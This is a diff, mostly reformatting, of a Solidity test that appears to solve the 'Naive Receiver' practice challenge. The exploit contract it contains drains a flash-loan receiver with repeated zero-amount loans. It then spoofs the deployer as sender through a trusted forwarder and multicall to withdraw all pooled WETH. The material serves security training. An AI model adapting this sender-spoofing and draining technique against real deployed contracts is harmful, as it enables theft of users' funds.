@@ -77,23 +77,11 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-         // Deploy attack contract
-    NaiveReceiverAttack attack = new NaiveReceiverAttack();
-    
-    // Execute attack to drain receiver and pool
-     attack.attack(
-        address(pool),
-        address(receiver),
-        recovery,
-        forwarder,
-        player,
-        deployer,
-        playerPk
-    );
+        // Deploy attack contract
+        NaiveReceiverAttack attack = new NaiveReceiverAttack();
 
-
-
-        
+        // Execute attack to drain receiver and pool
+        attack.attack(address(pool), address(receiver), recovery, forwarder, player, deployer, playerPk);
     }
 
     /**
@@ -114,17 +102,13 @@ contract NaiveReceiverChallenge is Test {
     }
 }
 
-
-
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-
-
-contract NaiveReceiverAttack is Test{
-
+contract NaiveReceiverAttack is Test {
     uint256 constant WETH_IN_POOL = 1000e18;
     uint256 constant WETH_IN_RECEIVER = 10e18;
- function attack(
+
+    function attack(
         address pool,
         address receiver,
         address recovery,
@@ -135,30 +119,23 @@ contract NaiveReceiverAttack is Test{
     ) external {
         NaiveReceiverPool poolContract = NaiveReceiverPool(pool);
         WETH weth = poolContract.weth();
-        
+
         // First drain the receiver with flash loans
-        for(uint i = 0; i < 10; i++) {
-            poolContract.flashLoan(
-                IERC3156FlashBorrower(receiver),
-                address(weth),
-                0,
-                ""
-            );
+        for (uint256 i = 0; i < 10; i++) {
+            poolContract.flashLoan(IERC3156FlashBorrower(receiver), address(weth), 0, "");
         }
 
         // Prepare the withdrawal call that needs to appear from player
         bytes[] memory multicallData = new bytes[](1); // 10 flash loans + 1 withdraw
-         // Add withdraw call
-        multicallData[0] =  abi.encodePacked(abi.encodeCall(poolContract.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            // Add withdraw call
+        multicallData[0] = abi.encodePacked(
+            abi.encodeCall(poolContract.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
             bytes32(uint256(uint160(deployer)))
         );
 
-        bytes memory multicallEncoded = abi.encodeCall(
-            poolContract.multicall,
-            (multicallData)
-        );
+        bytes memory multicallEncoded = abi.encodeCall(poolContract.multicall, (multicallData));
 
-       // Create and sign forwarder request
+        // Create and sign forwarder request
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from: player, //address(uint160(uint256(keccak256(abi.encodePacked(signerPk))))), // derive address from private key
             target: address(pool),
@@ -169,12 +146,11 @@ contract NaiveReceiverAttack is Test{
             deadline: block.timestamp + 1 hours
         });
 
-
         // Construct the digest manually
         bytes32 structHash = forwarder.getDataHash(request);
         bytes32 domainSeparator = forwarder.domainSeparator();
         bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
-        
+
         // Sign the digest
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
         bytes memory signature = abi.encodePacked(r, s, v);
@@ -183,8 +159,6 @@ contract NaiveReceiverAttack is Test{
         forwarder.execute(request, signature);
     }
     // Required to receive ETH when unwrapping WETH
+
     receive() external payable {}
 }
-
-        
- 
